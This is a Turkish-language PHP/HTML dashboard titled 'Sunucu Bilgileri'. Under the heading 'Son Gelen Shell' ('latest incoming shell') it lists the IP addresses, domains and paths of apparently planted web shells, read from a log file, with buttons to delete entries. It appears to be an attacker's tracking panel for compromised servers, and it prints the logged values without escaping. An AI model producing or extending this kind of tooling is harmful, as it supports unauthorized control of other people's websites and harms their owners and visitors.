<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Sunucu Bilgileri</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #121212; 
            color: #ffffff; 
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #1f1f1f;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
            border-radius: 10px;
        }

        h1 {
            color: #00bcd4;
            text-align: center;
        }

        .info {
            font-size: 18px;
        }

        .info-item {
            margin-bottom: 10px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        th, td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #444;
            position: relative; 
        }

        th {
            background-color: #333;
            color: #ffffff; 
        }

        
        td::before {
            content: '';
            width: 100%;
            height: 2px; 
            background-color: aqua; 
            position: absolute;
            top: 0;
            left: 0;
            transform-origin: left center;
            transform: scaleX(0); 
            transition: transform 0.5s ease-in-out;
        }

        td:hover::before {
            transform: scaleX(1); 
        }

        .pagination {
            text-align: center;
            margin-top: 20px;
        }

        .pagination a {
            display: inline-block;
            padding: 5px 10px;
            background-color: #333;
            color: #ffffff;
            text-decoration: none;
            margin-right: 5px;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }

        .pagination a:hover {
            background-color: #444;
        }

        .delete-button {
            background-color: #f44336; 
            color: white;
            border: none;
            padding: 5px 10px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s ease;
        }

        .delete-button:hover {
            background-color: #ff5733; 
        }

        
        .new-log-row {
            background-color: #262626; 
            animation: fadeIn 0.5s ease;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo" style="text-align: center;">
            <img src="tht.png" width="500" alt="Logo">
        </div>
        <h1>Sunucu Bilgileri</h1>
        <div class="info">
            <div class="info-item">
                <strong>IP Adresi:</strong> <?php echo $_SERVER['SERVER_ADDR']; ?>
            </div>
            <div class="info-item">
                <strong>Domain:</strong> <?php echo $_SERVER['SERVER_NAME']; ?>
            </div>
            <div class="info-item">
                <strong>Path:</strong> <?php echo $_SERVER['REQUEST_URI']; ?>
            </div>
        </div>
        <h2>Son Gelen Shell</h2>
        <table>
            <tr>
                <th>IP Adresi</th>
                <th>Domain</th>
                <th>Path</th>
                <th>İşlemler</th>
            </tr>
            <?php

            $logData = file_exists('log.json') ? json_decode(file_get_contents('log.json'), true) : [];

            $logData = array_reverse($logData, true);

            foreach ($logData as $id => $logEntry) {
    $isNewLog = $id < 25; 
    $rowClass = $isNewLog ? 'new-log-row' : '';

    echo "<tr class='$rowClass'>";
    echo "<td>{$logEntry['ip']}</td>";
    echo "<td>{$logEntry['domain']}</td>";
    echo "<td>{$logEntry['path']}</td>";
    echo "<td><button class='delete-button' onclick='deleteLog($id)'>Sil</button></td>";
    echo "</tr>";
}
?>


</table>
</div>
<script>
    function deleteLog(id) {
        if (confirm("Bu shelli silmek istediğinizden emin misiniz?")) {

            var xhr = new XMLHttpRequest();
            xhr.open("GET", 'delete.php?id=' + id, true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4) {
                    if (xhr.status == 200) {

                        window.location.reload();
                    } else {

                        alert("Silme işlemi sırasında bir hata oluştu.");
                    }
                }
            };
            xhr.send();
        }
    }
</script>
</body>
</html>
